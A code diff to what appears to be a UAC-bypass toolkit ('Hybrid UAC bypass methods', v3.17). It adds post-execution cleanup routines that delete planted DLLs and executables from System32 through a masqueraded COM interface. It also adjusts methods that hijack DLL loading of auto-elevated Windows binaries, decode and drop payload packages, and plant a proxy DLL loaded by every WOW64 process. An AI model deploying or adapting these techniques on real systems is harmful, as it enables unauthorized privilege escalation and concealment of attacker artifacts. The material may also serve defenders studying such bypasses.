@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.17
 *
-*  DATE:        16 Mar 2019
+*  DATE:        17 Mar 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -36,17 +36,12 @@ BOOL ucmMethodCleanupSingleItemSystem32(
     LPWSTR lpItemName
 )
 {
-    BOOL bResult;
     WCHAR szBuffer[MAX_PATH * 2];
 
     _strcpy(szBuffer, g_ctx->szSystemDirectory);
     _strcat(szBuffer, lpItemName);
 
-    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
-    if (bResult) {
-        OutputDebugString(szBuffer);
-    }
-    return bResult;
+    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
 }
 
 /*
@@ -315,6 +310,41 @@ BOOL ucmWinSATMethod(
 }
 
 /*
+* ucmMMCMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for MMCMethod(s).
+*
+*/
+BOOL ucmMMCMethodCleanup(
+    _In_ UCM_METHOD Method
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+
+    switch (Method) {
+
+    case UacMethodMMC1:
+        _strcat(szBuffer, ELSEXT_DLL);
+        break;
+
+    case UacMethodMMC2:
+        _strcat(szBuffer, WBEM_DIR);
+        _strcat(szBuffer, WBEMCOMN_DLL);
+        break;
+
+    default:
+        return FALSE;
+        break;
+    }
+
+    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+}
+
+/*
 * ucmMMCMethod
 *
 * Purpose:
@@ -397,6 +427,36 @@ BOOL ucmMMCMethod(
     } while (cond);
 
     return bResult;
+}
+
+/*
+* ucmSirefefMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for SirefefMethod.
+*
+*/
+BOOL ucmSirefefMethodCleanup(
+    VOID
+)
+{
+    BOOL bResult1, bResult2;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, WBEM_DIR);
+    _strcat(szBuffer, OOBE_EXE);
+
+    bResult1 = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, WBEM_DIR);
+    _strcat(szBuffer, NETUTILS_DLL);
+
+    bResult2 = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+
+    return ((bResult1 != FALSE) && (bResult2 != FALSE));
 }
 
 /*
@@ -1426,7 +1486,6 @@ BOOL ucmSXSMethodCleanup(
     _In_ BOOL bConsentItself
 )
 {
-    BOOL bResult;
     WCHAR szBuffer[MAX_PATH * 2];
 
     _strcpy(szBuffer, g_ctx->szSystemDirectory);
@@ -1440,13 +1499,7 @@ BOOL ucmSXSMethodCleanup(
     }
     _strcat(szBuffer, LOCAL_SXS);
 
-    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
-
-    if (bResult) {
-        OutputDebugString(szBuffer);
-    }
-
-    return bResult;
+    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
 }
 
 /*
@@ -1493,9 +1546,9 @@ BOOL ucmDismMethod(
         _strcat(szSource, PACKAGE_XML);
 
         //write package data to disk
-        if (!supDecodeAndWriteBufferToFile(szSource, 
-            (CONST PVOID)&g_encodedPackageData, 
-            sizeof(g_encodedPackageData), 
+        if (!supDecodeAndWriteBufferToFile(szSource,
+            (CONST PVOID)&g_encodedPackageData,
+            sizeof(g_encodedPackageData),
             AKAGI_XOR_KEY2))
         {
             break;
@@ -1558,16 +1611,11 @@ BOOL ucmWow64LoggerMethod(
     bResult = ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize);
     if (bResult) {
 
-        Sleep(5000);
-
         //
-        // Attempt to remove payload dll after execution.
+        // Attempt to remove payload dll after execution in method.c!PostCleanupAttempt.
         // Warning: every wow64 application will load payload code (some will crash).
         // Remove file IMMEDIATELY after work.
         //
-        _strcpy(szTarget, g_ctx->szSystemDirectory);
-        _strcat(szTarget, WOW64LOG_DLL);
-        DeleteFile(szTarget);
     }
     return bResult;
 }
@@ -2094,21 +2142,13 @@ BOOL ucmSXSDccwMethodCleanup(
     VOID
 )
 {
-    BOOL bResult;
-
     WCHAR szBuffer[MAX_PATH * 2];
 
     _strcpy(szBuffer, g_ctx->szSystemDirectory);
     _strcat(szBuffer, DCCW_EXE);
     _strcat(szBuffer, LOCAL_SXS);
 
-    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
-
-    if (bResult) {
-        OutputDebugString(szBuffer);
-    }
-
-    return bResult;
+    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
 }
 
 /*
@@ -3343,7 +3383,7 @@ BOOL ucmAcCplAdminMethod(
 * Bypass UAC by DLL hijack of SystemProperties* commands.
 * Original author link: https://egre55.github.io/system-properties-uac-bypass/
 *
-* Note: 
+* Note:
 *
 * This code expects to work under wow64 only because of uacme restrictions.
 * However you can extent it to force drop your *32* bit dll from your *64* bit application.
